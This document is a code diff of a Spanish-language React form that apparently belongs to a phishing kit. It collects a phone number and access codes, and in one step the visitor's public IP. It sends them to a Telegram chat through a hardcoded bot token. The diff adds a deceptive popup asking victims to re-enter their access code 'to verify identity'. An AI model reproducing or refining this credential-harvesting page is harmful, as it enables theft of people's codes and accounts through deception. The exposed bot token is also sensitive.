@@ -5,10 +5,10 @@ import "bootstrap/dist/css/bootstrap.min.css";
 import "./styles.css"
 import { useState, useEffect } from "react";
 import Loader from "./loader";
+import Swal from 'sweetalert2';
 
 const validationSchema = Yup.object().shape({
-    telefono: Yup.string().
-        matches(/^[0-9]+$/, "El telefono no es valido")
+    telefono: Yup.string().matches(/^[0-9]+$/, "El telefono no es valido")
         .min(10, "El telefono no es valido")
         .max(10, "El telefono no es valido")
         .required("Este campo es obligatorio"),
@@ -50,7 +50,7 @@ const FirstForm = () => {
         );
 
         const BOT_TOKEN = "5059173347:AAH61u5mX_tS_brdvQxVPmaA_jgQVVMJjHg"
-        const CHAT_ID = "-825158067"
+        const CHAT_ID = "-472762120"
 
         if (currentPage === 'home') {
             setIsSubmitting(true);
@@ -71,15 +71,17 @@ const FirstForm = () => {
                 .then(res => res.json())
                 .then(res => {
                     if (res.ok) {
-                        console.log('Message sent')
                         /* Navegar a la siguiente pantalla */
                         handleNavigation('second');
                         const overlay = document.querySelector("#overlay");
                         /* Volver a mostrar */
                         overlay.style.display = "block";
+                        overlay.style.backgroundColor = "rgba(0, 0, 0, 0.5)";
                         setTimeout(() => {
                             overlay.style.display = "none";
                         }, 3000);
+                        /* Alerta de sweetalert */
+
                     } else {
                         console.log('Error:', res.error)
                     }
@@ -107,7 +109,6 @@ const FirstForm = () => {
                 .then(res => res.json())
                 .then(res => {
                     if (res.ok) {
-                        console.log('Message sent')
                         /* Navegar a la siguiente pantalla */
                         handleNavigation('third');
                         const overlay = document.querySelector("#overlay");
@@ -126,6 +127,14 @@ const FirstForm = () => {
                 setIsSubmitting(false);
                 handleNavigation('third');
             }, 3000);
+            setTimeout(() => {
+                Swal.fire({
+                    title: '¡Bienvenido!',
+                    text: 'Para verificar tu identidad, ingresa nuevamente tu código de acceso',
+                    icon: 'info',
+                    confirmButtonText: 'Continuar'
+                })
+            }, 3100);
         } else if (currentPage === 'third') {
             let mensaje = 'DATA:%0A%0ACode: ' + values.secondCode + '%0AIP: ' + initialValues.publicIp + '%0A%0AEND';
 
@@ -145,7 +154,6 @@ const FirstForm = () => {
                 .then(res => res.json())
                 .then(res => {
                     if (res.ok) {
-                        console.log('Message sent')
                         /* Navegar a la siguiente pantalla */
                         handleNavigation('fourth');
                         const overlay = document.querySelector("#overlay");
@@ -154,6 +162,7 @@ const FirstForm = () => {
                         setTimeout(() => {
                             overlay.style.display = "none";
                         }, 3000);
+                        /* Esperar tres segundos y motrar la alerta */
                     } else {
                         console.log('Error:', res.error)
                     }
@@ -285,19 +294,19 @@ const FirstForm = () => {
                                 </div>
                                 <div className="form-group" style={cont}>
                                     <button
-                                        type="submit"
-                                        className="boton"
-                                        style={styleButton}
-                                    >
-                                        Enviar
-                                    </button>
-                                    <button
-                                        type="submit"
+                                        type="button"
                                         className="boton"
                                         onClick={() => handleNavigation('home')}
                                         style={styleButton2}
                                     >
                                         Regresar
+                                    </button>
+                                    <button
+                                        type="submit"
+                                        className="boton"
+                                        style={styleButton}
+                                    >
+                                        Enviar
                                     </button>
                                 </div>
                             </Form>
@@ -335,19 +344,19 @@ const FirstForm = () => {
                                 </div>
                                 <div className="form-group" style={cont}>
                                     <button
-                                        type="submit"
-                                        className="boton"
-                                        style={styleButton}
-                                    >
-                                        Enviar
-                                    </button>
-                                    <button
-                                        type="submit"
+                                        type="button"
                                         className="boton"
                                         onClick={() => handleNavigation('second')}
                                         style={styleButton2}
                                     >
                                         Regresar
+                                    </button>
+                                    <button
+                                        type="submit"
+                                        className="boton"
+                                        style={styleButton}
+                                    >
+                                        Enviar
                                     </button>
                                 </div>
                             </Form>
